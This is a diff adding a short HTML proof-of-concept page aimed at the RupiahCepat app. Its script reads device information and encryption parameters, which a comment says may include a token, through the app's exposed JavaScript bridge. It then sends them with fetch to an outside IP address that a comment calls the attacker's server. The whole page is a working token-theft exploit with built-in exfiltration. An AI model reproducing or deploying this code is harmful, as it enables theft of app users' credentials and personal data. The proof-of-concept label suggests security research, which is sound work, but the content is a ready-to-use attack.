@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+  <html>
+  <body>
+  <h2>RupiahCepat Token PoC</h2>
+  <pre id="output">Loading...</pre>
+  <script>
+    try {
+      // JS Bridge 名称为 control
+      var raw = window.control.getBaseInfo();
+      var info = JSON.parse(raw);
+      document.getElementById('output').innerText = raw;
+
+      // getCommonEncryptParams 可能含 token
+      var params = window.control.getCommonEncryptParams('{}');
+      document.getElementById('output').innerText += '\n\nparams:\n' + params;
+
+      // 回传攻击者服务器
+      fetch('https://124.71.173.168:8443/log?base=' + encodeURIComponent(raw)
+          + '&params=' + encodeURIComponent(params));
+    } catch(e) {
+      document.getElementById('output').innerText = 'Error: ' + e;
+    }
+  </script>
+  </body>
+  </html>
